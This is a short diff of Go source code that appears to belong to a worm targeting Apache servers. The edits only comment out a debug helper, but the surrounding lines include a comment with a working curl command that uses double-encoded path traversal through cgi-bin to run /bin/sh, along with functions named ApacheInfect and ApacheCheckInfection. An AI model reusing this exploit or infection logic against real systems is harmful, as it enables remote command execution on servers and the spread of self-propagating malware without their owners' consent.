@@ -6,7 +6,7 @@ import (
 	"net"
 	"encoding/base64"
 	"strings"
-	"os"
+	//"os"
 )
 
 //Command execution: curl -X POST localhost:80/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh -d 'echo;ls -l /tmp/worm | wc -l'
@@ -72,11 +72,12 @@ func ApacheInfect(ip string, port string) bool {
 	commands = fmt.Sprintf(commandsTemplate,commands)
 	MakeRequest2(ip,port,commands)
 	
-	test("Apache fi")
+	//test("Apache fi")
 	return ApacheCheckInfection(ip,port)
 }
 
+/*
 func test(s string) {
 	d1 := []byte(s)
     os.WriteFile("/tmp/test.txt", d1, 0644)
-}
+}*/
